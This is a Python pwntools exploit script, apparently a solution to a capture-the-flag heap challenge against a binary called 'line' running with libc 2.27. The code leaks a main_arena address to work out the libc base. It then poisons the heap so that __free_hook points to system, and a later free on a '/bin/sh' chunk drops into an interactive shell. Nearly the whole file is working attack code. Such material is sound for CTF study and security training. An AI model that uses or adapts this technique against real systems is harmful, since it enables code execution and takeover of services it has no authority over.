#!/usr/bin/python2
# -*- coding:utf-8 -*-

from pwn import *
import os
import struct
import random
import time
import sys
import signal

salt = os.getenv('GDB_SALT') if (os.getenv('GDB_SALT')) else ''


def clear(signum=None, stack=None):
    print('Strip  all debugging information')
    os.system(
        'rm -f /tmp/gdb_symbols{}* /tmp/gdb_pid{}* /tmp/gdb_script{}*'.replace('{}', salt))
    exit(0)


for sig in [signal.SIGINT, signal.SIGHUP, signal.SIGTERM]:
    signal.signal(sig, clear)

# # Create a symbol file for GDB debugging
# try:
#     gdb_symbols = '''

#     '''

#     f = open('/tmp/gdb_symbols{}.c'.replace('{}', salt), 'w')
#     f.write(gdb_symbols)
#     f.close()
#     os.system('gcc -g -shared /tmp/gdb_symbols{}.c -o /tmp/gdb_symbols{}.so'.replace('{}', salt))
#     # os.system('gcc -g -m32 -shared /tmp/gdb_symbols{}.c -o /tmp/gdb_symbols{}.so'.replace('{}', salt))
# except Exception as e:
#     print(e)

context.arch = 'amd64'
# context.arch = 'i386'
# context.log_level = 'debug'
execve_file = './line'
# sh = process(execve_file, env={'LD_PRELOAD': '/tmp/gdb_symbols{}.so'.replace('{}', salt)})
sh = process(execve_file)
# sh = remote('', 0)
elf = ELF(execve_file)
libc = ELF('./libc-2.27.so')
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# Create temporary files for GDB debugging
try:
    gdbscript = '''
    define pr
        x/8wx $rebase(0x202140)
        end
    '''

    f = open('/tmp/gdb_pid{}'.replace('{}', salt), 'w')
    f.write(str(proc.pidof(sh)[0]))
    f.close()

    f = open('/tmp/gdb_script{}'.replace('{}', salt), 'w')
    f.write(gdbscript)
    f.close()
except Exception as e:
    print(e)


def New(id, size, content):
    sh.sendlineafter('choice: ', '1')
    sh.sendlineafter('ID: ', str(id))
    sh.sendlineafter('SIZE: ', str(size))
    sh.send(content)

def show():
    sh.sendlineafter('choice: ', '2')

for i in range(8):
    New(i + 1, 0xf8, '\n')

for i in range(7):
    New(i + 0x10, 0x28, '\n')

New(0x100, 1, '\xa0')
show()
sh.recvuntil('8 : 256 (')
result = sh.recvuntil(')', drop=True)
main_arena_addr = u64(result.ljust(8, '\0')) - 0x160
log.success('main_arena_addr: ' + hex(main_arena_addr))

libc_addr = main_arena_addr - (libc.symbols['__malloc_hook'] + 0x10)
log.success('libc_addr: ' + hex(libc_addr))


New(0x100, 1, '\n')

for i in range(7):
    if(0x20 + i == 0x23):
        New(0x20 + i, 0x38, '/bin/sh\0')
    else:
        New(0x20 + i, 0x38, '\n')

New(0x101, 0x38, '\n')
New(0x102, 0x18, p64(libc_addr + libc.symbols['__free_hook']))
New(0x103, 0x18, '\n')
New(0x104, 0x18, p64(libc_addr + libc.symbols['system']))
sh.sendlineafter('choice: ', '1')
sh.sendlineafter('ID: ', str(0x105))

sh.interactive()
clear()
